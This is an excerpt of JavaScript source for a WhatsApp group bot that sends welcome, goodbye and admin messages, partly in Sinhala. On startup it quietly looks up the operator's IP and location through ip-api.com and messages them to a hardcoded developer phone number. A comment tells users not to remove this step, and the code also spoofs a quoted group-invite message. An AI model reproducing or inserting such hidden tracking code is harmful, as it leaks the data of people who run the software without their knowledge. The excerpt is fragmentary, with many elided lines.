...
const starts = async (thanuwa = new WAConnection()) => {
...
//  ngak penting tapi jangan lu hapus
    ...
    thanuwa.logger.level = 'warn'
    thanuwa.version = [2, 2143, 3] 
    thanuwa.browserDescription = ["Queen Alexa", "Safari", "3.0"];

    thanuwa.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr, bro, make WhatsApp 👍 '))
    })
    console.log()
    fs.existsSync('./session.json') && thanuwa.loadAuthInfo('./session.json')
    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       thanuwa.sendMessage("94764781212@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer MR_THANUWA",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94764781212?text=welcome"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
    thanuwa.on('connecting', () => {
    console.log()
...
const imageToBase64 = require('image-to-base64')
      ...
      console.log(anu);
                try {
                pp_user = await thanuwa.getProfilePicture(mem)
                } catch (e) {
                pp_user = 'https://i.imgur.com/rJBKu0Z.jpg'
            }
            try {
                pp_grup = await thanuwa.getProfilePicture(anu.jid)
                } catch (e) {
      ...
      if (anu.action == "add" && !mem.includes(thanuwa.user.jid)) {
        mdata = await thanuwa.groupMetadata(anu.jid);
        memeg = mdata.participants.length;
        num = anu.participants[0];
        let v = thanuwa.contacts[num] || { notify: num.replace(/@.+/, "") };
       ...
       buff = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/welcome?name=${anu_user}&picurl=${imge}&namegrp=${encodeURI(mdata.subject)}&imggrp=${ime}&member=@${anu_user}&picbg=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTk_nUY-WcxLBvTRJPNBUKhqWA6LdZCmZG75A&usqp=CAU`);
        ...
        imageMsg = (
          await thanuwa.prepareMessageMedia(buff, "imageMessage", {
            thumbnail: buff,
          })
        ).imageMessage;
        buttonsMessage = {
        ...
        prep = await thanuwa.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {}
        );
        thanuwa.relayWAMessage(prep);
      }
      
      if (anu.action == "remove" && !mem.includes(thanuwa.user.jid)) {
        mdata = await thanuwa.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = thanuwa.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        memeg = mdata.participants.length;
        out = `ඇයි අනේ ඔයා යන්නෙ? \nGood bye ${anu_user} ආයේ මුනගැහෙමු සහෝ`;
      ...
      if (anu.action == "promote") {
        const mdata = await thanuwa.groupMetadata(anu.jid);
        anu_user = thanuwa.contacts[mem];
        num = anu.participants[0];
        try {
          ppimg = await thanuwa.getProfilePicture(
        ...
        thanuwa.sendMessage(mdata.id, teks, MessageType.text);
      }
    ...
    thanuwa.on('group-update', async (anu) => {
    falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
    remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "thanuwabot", "caption": `Creator Botwea © 2K21`, 'jpegThumbnail': fs.readFileSync(`image/${setting.thumb}`)}}}    	
      metdata = await thanuwa.groupMetadata(anu.jid)
        if(anu.announce == 'false'){
        teks = `「 GROUP OPENED 」\n\nGroup has been opened by admin\nNow all members can send messages`
        thanuwa.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
        ...
        thanuwa.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
